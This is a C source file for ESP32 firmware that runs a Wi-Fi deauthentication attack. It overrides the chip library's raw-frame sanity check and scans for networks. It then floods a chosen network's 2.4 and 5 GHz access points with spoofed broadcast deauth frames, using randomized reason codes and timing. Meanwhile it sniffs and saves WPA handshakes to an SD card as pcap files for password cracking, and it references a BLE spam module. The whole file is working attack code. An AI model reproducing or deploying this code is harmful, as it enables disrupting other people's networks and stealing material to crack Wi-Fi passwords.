// main/deauth.c
#include "deauth.h"
#include "handshake.h"
#include "wifi_sniffer.h"
#include "ble_spam.h"
#include "usb_protocol.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_mac.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "ui.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "deauth";

// The library symbol is WEAK in IDF 5.5.5 C5 (confirmed via nm).
// This strong definition overrides it and lets deauth frames through.
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

#define SCAN_DONE_BIT  BIT0
#define STA_START_BIT  BIT1

static EventGroupHandle_t s_scan_evt    = NULL;
static deauth_network_t   s_nets[DEAUTH_MAX_NETWORKS];
static int                s_net_count   = 0;
static volatile bool      s_scan_done   = false;
static volatile bool      s_band_mode_set = false;

static volatile bool      s_deauth_running = false;
static TaskHandle_t       s_deauth_task    = NULL;

#define DEAUTH_SEC_WPA2_PSK  (1u << 3)
#define DEAUTH_SEC_WPA3_SAE  (1u << 5)
#define DEAUTH_SEC_PMF_REQ   (1u << 9)

typedef struct {
    uint8_t bssid[6];
    uint8_t channel;
    char    ssid[33];
} deauth_target_t;

typedef struct {
    int count;
    deauth_target_t t[2];
} deauth_targets_t;

static deauth_targets_t s_targets;

static void promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    handshake_feed(pkt->payload, pkt->rx_ctrl.sig_len,
                   pkt->rx_ctrl.rssi, pkt->rx_ctrl.channel);
}

static void wifi_event_handler(void *arg, esp_event_base_t base,
                               int32_t event_id, void *data)
{
    (void)arg; (void)data;
    if (base != WIFI_EVENT) return;

    if (event_id == WIFI_EVENT_STA_START) {
        if (!s_band_mode_set) {
            esp_err_t err = esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
            if (err == ESP_OK) s_band_mode_set = true;
            else ESP_LOGW(TAG, "set_band_mode(AUTO): %s", esp_err_to_name(err));
        }
        xEventGroupSetBits(s_scan_evt, STA_START_BIT);
    } else if (event_id == WIFI_EVENT_SCAN_DONE) {
        xEventGroupSetBits(s_scan_evt, SCAN_DONE_BIT);
    }
}

esp_err_t deauth_init(void)
{
    s_scan_evt = xEventGroupCreate();
    if (!s_scan_evt) return ESP_ERR_NO_MEM;
    ESP_ERROR_CHECK(esp_event_handler_instance_register(
        WIFI_EVENT, WIFI_EVENT_SCAN_DONE, &wifi_event_handler, NULL, NULL));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(
        WIFI_EVENT, WIFI_EVENT_STA_START, &wifi_event_handler, NULL, NULL));
    handshake_init();
    return ESP_OK;
}

esp_err_t deauth_scan_start(void)
{
    s_net_count    = 0;
    s_scan_done    = false;
    s_band_mode_set = false;
    xEventGroupClearBits(s_scan_evt, SCAN_DONE_BIT | STA_START_BIT);

    // Release NimBLE: 5 GHz scan fails with ESP_ERR_TIMEOUT when
    // Bluetooth is running (IDFGH-15407 / esp-idf#16059).
    ble_spam_release_radio();

    esp_err_t mode_err = esp_wifi_set_mode(WIFI_MODE_STA);
    if (mode_err != ESP_OK) return mode_err;

    esp_err_t e = esp_wifi_start();
    if (e == ESP_ERR_WIFI_STATE) {
        // Already started — STA_START will not fire again.
        s_band_mode_set = true;
        esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
    } else if (e != ESP_OK) {
        return e;
    } else {
        // Wait for STA_START to set band mode.
        EventBits_t bits = xEventGroupWaitBits(s_scan_evt, STA_START_BIT,
                                               pdFALSE, pdFALSE,
                                               pdMS_TO_TICKS(2000));
        if (!(bits & STA_START_BIT))
            ESP_LOGW(TAG, "STA_START timeout");
    }

    wifi_scan_config_t cfg = {
        .ssid = NULL, .bssid = NULL, .channel = 0,
        .show_hidden = false,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = { .active = { .min = 50, .max = 100 } },
    };

    esp_err_t err = esp_wifi_scan_start(&cfg, false);
    if (err != ESP_OK && err != ESP_ERR_WIFI_STATE) return err;
    return ESP_OK;
}

static void emit_scan_ap_usb(const deauth_network_t *n)
{
    uint8_t buf[64];
    size_t  p = 0;
    memcpy(&buf[p], n->bssid, 6);                 p += 6;
    size_t ssid_len = strlen(n->ssid);
    if (ssid_len > 32) ssid_len = 32;
    buf[p++] = (uint8_t)ssid_len;
    memcpy(&buf[p], n->ssid, ssid_len);           p += ssid_len;
    buf[p++] = n->channel;
    buf[p++] = (uint8_t)n->rssi;
    buf[p++] = (uint8_t)n->rssi;
    uint16_t sec = n->pmf_required
        ? (DEAUTH_SEC_WPA3_SAE | DEAUTH_SEC_PMF_REQ)
        : DEAUTH_SEC_WPA2_PSK;
    buf[p++] = sec & 0xFF;
    buf[p++] = (sec >> 8) & 0xFF;
    buf[p++] = 0;
    usb_send_typed_packet(USB_TYPE_SCAN_AP, buf, p);
}

static void harvest_scan(void)
{
    uint16_t num = DEAUTH_MAX_NETWORKS;
    wifi_ap_record_t records[DEAUTH_MAX_NETWORKS];
    if (esp_wifi_scan_get_ap_records(&num, records) != ESP_OK) return;

    s_net_count = 0;
    for (int i = 0; i < num && s_net_count < DEAUTH_MAX_NETWORKS; i++) {
        if (records[i].ssid[0] == 0) continue;
        deauth_network_t *n = &s_nets[s_net_count];
        memcpy(n->ssid, records[i].ssid, 32);
        n->ssid[32] = '\0';
        memcpy(n->bssid, records[i].bssid, 6);
        n->channel = records[i].primary;
        n->rssi    = records[i].rssi;
        n->pmf_required =
            (records[i].authmode == WIFI_AUTH_WPA3_PSK) ||
            (records[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK);
        s_net_count++;
        emit_scan_ap_usb(n);
    }
}

bool deauth_scan_done(void)
{
    if (s_scan_done) return true;
    EventBits_t bits = xEventGroupWaitBits(s_scan_evt, SCAN_DONE_BIT,
                                           pdFALSE, pdFALSE, 0);
    if (bits & SCAN_DONE_BIT) { harvest_scan(); s_scan_done = true; }
    return s_scan_done;
}

int deauth_network_count(void) { return s_net_count; }

const deauth_network_t *deauth_network_at(int idx)
{
    if (idx < 0 || idx >= s_net_count) return NULL;
    return &s_nets[idx];
}

static uint16_t random_deauth_reason(void)
{
    static const uint8_t reasons[] = { 1, 2, 3, 4, 5, 6, 7, 15 };
    return reasons[esp_random() % (sizeof(reasons) / sizeof(reasons[0]))];
}

static size_t build_deauth_frame(uint8_t *buf, const uint8_t *bssid)
{
    size_t i = 0;
    buf[i++] = 0xC0; buf[i++] = 0x00;
    uint16_t duration = esp_random() & 0x03FF;
    buf[i++] = duration & 0xFF;
    buf[i++] = (duration >> 8) & 0xFF;
    memset(&buf[i], 0xFF, 6); i += 6;
    memcpy(&buf[i], bssid, 6); i += 6;
    memcpy(&buf[i], bssid, 6); i += 6;
    uint16_t seq = esp_random() & 0x0FFF;
    buf[i++] = (seq << 4) & 0xF0;
    buf[i++] = (seq >> 4) & 0xFF;
    uint16_t reason = random_deauth_reason();
    buf[i++] = reason & 0xFF;
    buf[i++] = (reason >> 8) & 0xFF;
    return i;
}

// Find both BSSIDs (2.4 GHz + 5 GHz) that share the selected SSID.
static void collect_targets(int idx)
{
    memset(&s_targets, 0, sizeof(s_targets));
    const deauth_network_t *sel = &s_nets[idx];

    s_targets.t[0].channel = sel->channel;
    memcpy(s_targets.t[0].bssid, sel->bssid, 6);
    strncpy(s_targets.t[0].ssid, sel->ssid, 32);
    s_targets.t[0].ssid[32] = '\0';
    s_targets.count = 1;

    bool sel_24 = sel->channel <= 14;

    for (int i = 0; i < s_net_count && s_targets.count < 2; i++) {
        if (i == idx) continue;
        if (strcmp(s_nets[i].ssid, sel->ssid) != 0) continue;
        bool other_24 = s_nets[i].channel <= 14;
        if (other_24 == sel_24) continue;

        s_targets.t[s_targets.count].channel = s_nets[i].channel;
        memcpy(s_targets.t[s_targets.count].bssid, s_nets[i].bssid, 6);
        strncpy(s_targets.t[s_targets.count].ssid, s_nets[i].ssid, 32);
        s_targets.t[s_targets.count].ssid[32] = '\0';
        s_targets.count++;
    }

    // Always put 2.4 GHz first, so the cycle starts with a 2.4 GHz frame.
    if (s_targets.count == 2 && s_targets.t[0].channel > 14) {
        deauth_target_t tmp = s_targets.t[0];
        s_targets.t[0] = s_targets.t[1];
        s_targets.t[1] = tmp;
    }

    ESP_LOGI(TAG, "targets=%d  ch0=%u  ch1=%u", s_targets.count,
             s_targets.count > 0 ? s_targets.t[0].channel : 0,
             s_targets.count > 1 ? s_targets.t[1].channel : 0);
}

static void deauth_task(void *arg)
{
    (void)arg;
    int n = s_targets.count;
    if (n == 0) goto done;

    for (int i = 0; i < n; i++) handshake_reset(s_targets.t[i].bssid);

    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA};
    if (esp_wifi_set_promiscuous_filter(&filter) != ESP_OK) goto done;
    if (esp_wifi_set_promiscuous_rx_cb(promiscuous_cb) != ESP_OK) goto done;
    if (esp_wifi_set_promiscuous(true) != ESP_OK) goto done;

    esp_wifi_set_max_tx_power(8);
    vTaskDelay(pdMS_TO_TICKS(50));

    bool dumped[2] = {false, false};
    int cur = 0;

    while (s_deauth_running) {
        int ti = cur % n;
        const uint8_t *bssid = s_targets.t[ti].bssid;
        uint8_t ch = s_targets.t[ti].channel;

        // Band follows channel: >=36 -> 5 GHz, <=14 -> 2.4 GHz.
        esp_err_t ce = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        if (ce == ESP_OK) {
            uint8_t frame[26];
            size_t flen = build_deauth_frame(frame, bssid);
            esp_wifi_80211_tx(WIFI_IF_STA, frame, (int)flen, false);
        } else {
            ESP_LOGW(TAG, "set_channel(%u): %s", ch, esp_err_to_name(ce));
        }

        if (!dumped[ti] && handshake_is_usable(bssid)) {
            esp_err_t r = handshake_dump_pcap(bssid, s_targets.t[ti].ssid);
            if (r == ESP_OK) {
                char bssid_str[18];
                char path[96];
                uint32_t epoch = (uint32_t)(esp_timer_get_time() / 1000000);
                snprintf(bssid_str, sizeof(bssid_str),
                         "%02x:%02x:%02x:%02x:%02x:%02x",
                         bssid[0], bssid[1], bssid[2],
                         bssid[3], bssid[4], bssid[5]);
                snprintf(path, sizeof(path),
                         "/sdcard/handshakes/%02x%02x%02x%02x%02x%02x_%lu.pcap",
                         bssid[0], bssid[1], bssid[2],
                         bssid[3], bssid[4], bssid[5],
                         (unsigned long)epoch);
                usb_send_handshake(bssid_str, s_targets.t[ti].ssid, path);
                ui_set_status("CAPTURED");
                dumped[ti] = true;      // dump once, keep attacking
            } else {
                ui_set_status("SD FAIL");
            }
        }

        cur++;
        uint32_t jitter_ms = 20 + (esp_random() % 61);
        vTaskDelay(pdMS_TO_TICKS(jitter_ms));
    }

    esp_wifi_set_promiscuous(false);

done:
    esp_wifi_set_max_tx_power(78);
    wifi_sniffer_rearm();
    s_deauth_running = false;
    s_deauth_task    = NULL;
    vTaskDelete(NULL);
}

esp_err_t deauth_start(int idx)
{
    if (s_deauth_running) return ESP_OK;
    if (idx < 0 || idx >= s_net_count) return ESP_ERR_INVALID_ARG;
    if (s_nets[idx].pmf_required) return ESP_ERR_NOT_SUPPORTED;

    collect_targets(idx);

    s_deauth_running = true;
    BaseType_t ret = xTaskCreate(deauth_task, "deauth_tx", 4096, NULL, 5,
                                 &s_deauth_task);
    if (ret != pdPASS) {
        s_deauth_running = false;
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

esp_err_t deauth_stop(void)
{
    if (!s_deauth_running) return ESP_OK;
    s_deauth_running = false;
    for (int i = 0; i < 20 && s_deauth_task != NULL; i++)
        vTaskDelay(pdMS_TO_TICKS(50));
    return ESP_OK;
}

bool deauth_is_running(void) { return s_deauth_running; }